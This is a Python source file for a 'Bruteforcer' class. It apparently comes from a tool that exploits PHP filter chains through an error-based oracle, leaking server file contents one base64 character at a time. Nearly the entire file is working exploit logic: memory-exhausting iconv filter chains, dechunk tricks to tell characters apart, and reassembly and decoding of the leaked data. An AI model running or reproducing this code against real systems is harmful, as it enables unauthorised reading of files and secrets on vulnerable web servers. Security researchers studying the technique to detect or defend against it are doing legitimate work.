import binascii
import base64
import signal
from os import get_terminal_size

"""
Class Bruteforcer, defines all the bruteforce logic.
"""
class Bruteforcer:
    def __init__(self, requestor):
        self.requestor = requestor
        self.blow_up_utf32 = 'convert.iconv.L1.UCS-4'
        self.blow_up_inf = self.join(*[self.blow_up_utf32]*15)
        self.header = f'convert.base64-encode'
        self.flip = "convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993|convert.base64-decode|convert.base64-encode"
        # In some cases, warning triggered by invalid multibyte sequence will throw 500, this flip patches the issue
        self.flip_warning_friendly = "convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993|convert.base64-decode|convert.base64-encode"
        self.r2 = "convert.iconv.CSUNICODE.UCS-2BE"
        self.r4 = "convert.iconv.UCS-4LE.10646-1:1993"
        self.rot1 = 'convert.iconv.437.CP930'
        self.be = 'convert.quoted-printable-encode|convert.iconv..UTF7|convert.base64-decode|convert.base64-encode'
        self.result = ""
        self.b64_string = ""

    def join(self, *x):
        return '|'.join(x)

    def err(self, s):
        print(s)
        raise ValueError

    """
    Used to retrieve characters further in the leaked content
    """
    def get_nth(self, n):
        o = []
        chunk = n // 2
        if chunk % 2 == 1: o.append(self.r4)
        o.extend([self.flip, self.r4] * (chunk // 2))
        if (n % 2 == 1) ^ (chunk % 2 == 1): o.append(self.r2)
        return self.join(*o)


    """
    Used to identify any character which is not a number
    """
    def find_letter(self, prefix):
        if not self.requestor.error_oracle(f'{prefix}|dechunk|{self.blow_up_inf}'):
            # a-f A-F 0-9
            if not self.requestor.error_oracle(f'{prefix}|{self.rot1}|dechunk|{self.blow_up_inf}'):
                # a-e
                for n in range(5):
                    if self.requestor.error_oracle(f'{prefix}|' + f'{self.rot1}|{self.be}|'*(n+1) + f'{self.rot1}|dechunk|{self.blow_up_inf}'):
                        return 'edcba'[n]
                        break
                else:
                    return False
            elif not self.requestor.error_oracle(f'{prefix}|string.tolower|{self.rot1}|dechunk|{self.blow_up_inf}'):
                # A-E
                for n in range(5):
                    if self.requestor.error_oracle(f'{prefix}|string.tolower|' + f'{self.rot1}|{self.be}|'*(n+1) + f'{self.rot1}|dechunk|{self.blow_up_inf}'):
                        return 'EDCBA'[n]
                        break
                else:
                    return False
            elif not self.requestor.error_oracle(f'{prefix}|convert.iconv.CSISO5427CYRILLIC.855|dechunk|{self.blow_up_inf}'):
                return '*'
            elif not self.requestor.error_oracle(f'{prefix}|convert.iconv.CP1390.CSIBM932|dechunk|{self.blow_up_inf}'):
                # f
                return 'f'
            elif not self.requestor.error_oracle(f'{prefix}|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|{self.blow_up_inf}'):
                # F
                return 'F'
            else:
                return False
        elif not self.requestor.error_oracle(f'{prefix}|string.rot13|dechunk|{self.blow_up_inf}'):
            # n-s N-S
            if not self.requestor.error_oracle(f'{prefix}|string.rot13|{self.rot1}|dechunk|{self.blow_up_inf}'):
                # n-r
                for n in range(5):
                    if self.requestor.error_oracle(f'{prefix}|string.rot13|' + f'{self.rot1}|{self.be}|'*(n+1) + f'{self.rot1}|dechunk|{self.blow_up_inf}'):
                        return 'rqpon'[n]
                        break
                else:
                    return False
            elif not self.requestor.error_oracle(f'{prefix}|string.rot13|string.tolower|{self.rot1}|dechunk|{self.blow_up_inf}'):
                # N-R
                for n in range(5):
                    if self.requestor.error_oracle(f'{prefix}|string.rot13|string.tolower|' + f'{self.rot1}|{self.be}|'*(n+1) + f'{self.rot1}|dechunk|{self.blow_up_inf}'):
                        return 'RQPON'[n]
                        break
                else:
                    return False
            elif not self.requestor.error_oracle(f'{prefix}|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|{self.blow_up_inf}'):
                # s
                return 's'
            elif not self.requestor.error_oracle(f'{prefix}|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|{self.blow_up_inf}'):
                # S
                return 'S'
            else:
                return False
        elif not self.requestor.error_oracle(f'{prefix}|{self.rot1}|string.rot13|dechunk|{self.blow_up_inf}'):
            # + i j k
            if not self.requestor.error_oracle(f'{prefix}|convert.iconv.UTF8.IBM1140|string.rot13|dechunk|{self.blow_up_inf}'):
                return '+'
            elif self.requestor.error_oracle(f'{prefix}|{self.rot1}|string.rot13|{self.be}|{self.rot1}|dechunk|{self.blow_up_inf}'):
                return 'k'
            elif self.requestor.error_oracle(f'{prefix}|{self.rot1}|string.rot13|{self.be}|{self.rot1}|{self.be}|{self.rot1}|dechunk|{self.blow_up_inf}'):
                return 'j'
            elif self.requestor.error_oracle(f'{prefix}|{self.rot1}|string.rot13|{self.be}|{self.rot1}|{self.be}|{self.rot1}|{self.be}|{self.rot1}|dechunk|{self.blow_up_inf}'):
                return 'i'
            else:
                return False
        elif not self.requestor.error_oracle(f'{prefix}|string.tolower|{self.rot1}|string.rot13|dechunk|{self.blow_up_inf}'):
            # I J K
            if self.requestor.error_oracle(f'{prefix}|string.tolower|{self.rot1}|string.rot13|{self.be}|{self.rot1}|dechunk|{self.blow_up_inf}'):
                return 'K'
            elif self.requestor.error_oracle(f'{prefix}|string.tolower|{self.rot1}|string.rot13|{self.be}|{self.rot1}|{self.be}|{self.rot1}|dechunk|{self.blow_up_inf}'):
                return 'J'
            elif self.requestor.error_oracle(f'{prefix}|string.tolower|{self.rot1}|string.rot13|{self.be}|{self.rot1}|{self.be}|{self.rot1}|{self.be}|{self.rot1}|dechunk|{self.blow_up_inf}'):
                return 'I'
            else:
                return False
        elif not self.requestor.error_oracle(f'{prefix}|string.rot13|{self.rot1}|string.rot13|dechunk|{self.blow_up_inf}'):
            # v w x
            if self.requestor.error_oracle(f'{prefix}|string.rot13|{self.rot1}|string.rot13|{self.be}|{self.rot1}|dechunk|{self.blow_up_inf}'):
                return 'x'
            elif self.requestor.error_oracle(f'{prefix}|string.rot13|{self.rot1}|string.rot13|{self.be}|{self.rot1}|{self.be}|{self.rot1}|dechunk|{self.blow_up_inf}'):
                return 'w'
            elif self.requestor.error_oracle(f'{prefix}|string.rot13|{self.rot1}|string.rot13|{self.be}|{self.rot1}|{self.be}|{self.rot1}|{self.be}|{self.rot1}|dechunk|{self.blow_up_inf}'):
                return 'v'
            else:
                return False
        elif not self.requestor.error_oracle(f'{prefix}|string.tolower|string.rot13|{self.rot1}|string.rot13|dechunk|{self.blow_up_inf}'):
            # V W X
            if self.requestor.error_oracle(f'{prefix}|string.tolower|string.rot13|{self.rot1}|string.rot13|{self.be}|{self.rot1}|dechunk|{self.blow_up_inf}'):
                return 'X'
            elif self.requestor.error_oracle(f'{prefix}|string.tolower|string.rot13|{self.rot1}|string.rot13|{self.be}|{self.rot1}|{self.be}|{self.rot1}|dechunk|{self.blow_up_inf}'):
                return 'W'
            elif self.requestor.error_oracle(f'{prefix}|string.tolower|string.rot13|{self.rot1}|string.rot13|{self.be}|{self.rot1}|{self.be}|{self.rot1}|{self.be}|{self.rot1}|dechunk|{self.blow_up_inf}'):
                return 'V'
            else:
                return False
        elif not self.requestor.error_oracle(f'{prefix}|convert.iconv.CP285.CP280|string.rot13|dechunk|{self.blow_up_inf}'):
            # Z
            return 'Z'
        elif not self.requestor.error_oracle(f'{prefix}|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|{self.blow_up_inf}'):
            # z
            return 'z'
        elif not self.requestor.error_oracle(f'{prefix}|string.rot13|convert.iconv.CP285.CP280|string.rot13|dechunk|{self.blow_up_inf}'):
            # M
            return 'M'
        elif not self.requestor.error_oracle(f'{prefix}|string.rot13|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|{self.blow_up_inf}'):
            # m
            return 'm'
        elif not self.requestor.error_oracle(f'{prefix}|convert.iconv.CP273.CP1122|string.rot13|dechunk|{self.blow_up_inf}'):
            # y
            return 'y'
        elif not self.requestor.error_oracle(f'{prefix}|string.tolower|convert.iconv.CP273.CP1122|string.rot13|dechunk|{self.blow_up_inf}'):
            # Y
            return 'Y'
        elif not self.requestor.error_oracle(f'{prefix}|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|{self.blow_up_inf}'):
            # l
            return 'l'
        elif not self.requestor.error_oracle(f'{prefix}|string.tolower|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|{self.blow_up_inf}'):
            # L
            return 'L'
        elif not self.requestor.error_oracle(f'{prefix}|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|{self.blow_up_inf}'):
            # h
            return 'h'
        elif not self.requestor.error_oracle(f'{prefix}|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|{self.blow_up_inf}'):
            # H
            return 'H'
        elif not self.requestor.error_oracle(f'{prefix}|string.rot13|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|{self.blow_up_inf}'):
            # u
            return 'u'
        elif not self.requestor.error_oracle(f'{prefix}|string.rot13|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|{self.blow_up_inf}'):
            # U
            return 'U'
        elif not self.requestor.error_oracle(f'{prefix}|convert.iconv.CP1390.CSIBM932|dechunk|{self.blow_up_inf}'):
            # g
            return 'g'
        elif not self.requestor.error_oracle(f'{prefix}|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|{self.blow_up_inf}'):
            # G
            return 'G'
        elif not self.requestor.error_oracle(f'{prefix}|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|{self.blow_up_inf}'):
            # t
            return 't'
        elif not self.requestor.error_oracle(f'{prefix}|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|{self.blow_up_inf}'):
            # T
            return 'T'
        elif not self.requestor.error_oracle(f'{prefix}|convert.iconv.UTF8.CP930|dechunk|{self.blow_up_inf}'):
            # /
            return '/'
        else:
            return '*'

    """
    Used to identify a number
    """
    def find_number(self, i):
        prefix = f'{self.header}|{self.get_nth(i)}|convert.base64-encode'
        s = self.find_letter(prefix)
        if s == 'M':
            # 0 - 3
            prefix = f'{self.header}|{self.get_nth(i)}|convert.base64-encode|{self.r2}'
            ss = self.find_letter(prefix)
            if ss in 'CDEFGH':
                return '0'
            elif ss in 'STUVWX':
                return '1'
            elif ss in 'ijklmn':
                return '2'
            elif ss in 'yz*':
                return '3'
        elif s == 'N':
            # 4 - 7
            prefix = f'{self.header}|{self.get_nth(i)}|convert.base64-encode|{self.r2}'
            ss = self.find_letter(prefix)
            if ss in 'CDEFGH':
                return '4'
            elif ss in 'STUVWX':
                return '5'
            elif ss in 'ijklmn':
                return '6'
            elif ss in 'yz*':
                return '7'
        elif s == 'O':
            # 8 - 9
            prefix = f'{self.header}|{self.get_nth(i)}|convert.base64-encode|{self.r2}'
            ss = self.find_letter(prefix)
            if ss in 'CDEFGH':
                return '8'
            elif ss in 'STUVWX':
                return '9'
        else:
            return '*'

    """
    Error based oracle bruteforcer
    """
    def bruteforce(self) :
        o = ''
        i = 0
        letter = True
        b64_string = ""

        while letter:
            prefix = f'{self.header}|{self.get_nth(i)}'
            letter = self.find_letter(prefix)
            # it's a number! check base64
            if letter == '*':
                letter = self.find_number(i)
            # Check if warning issue, retry the process
            if letter == '*' and self.flip != self.flip_warning_friendly:
                print("[*] Trying the process in a warning friendly way")
                self.flip = self.flip_warning_friendly
                continue
            i=i+1
            if letter:
                if len(o) % 4 == 3 or len(o) % 4 == 2:
                    b64_string = o
                    padding_len = 4 - (len(b64_string) % 4)
                    b64_string += padding_len * '='
                    self.b64_string = b64_string
                elif len(o) % 4 == 1:
                     b64_string = o
                     b64_string += 'A=='
                     self.b64_string = b64_string
                print(b64_string, flush = True)
                try:
                    print(base64.b64decode(b64_string),flush=True)
                except UnicodeDecodeError:
                    print("[-] Cannot decode value :( (probably a timing attack)")
                except binascii.Error:
                    print("[-] binascii error :( (probably due to timing attack)")
                o += letter
                self.result = o
                #Clear lines (only if text was printed)
                for clean_number in range (0, int(len(o)/get_terminal_size().columns)+1):
                    print("\033[1A", end="\x1b[2K")
                for clean_number in range (0, int(len(str(base64.b64decode(b64_string)))/get_terminal_size().columns)+1):
                    print("\033[1A", end="\x1b[2K")
        return o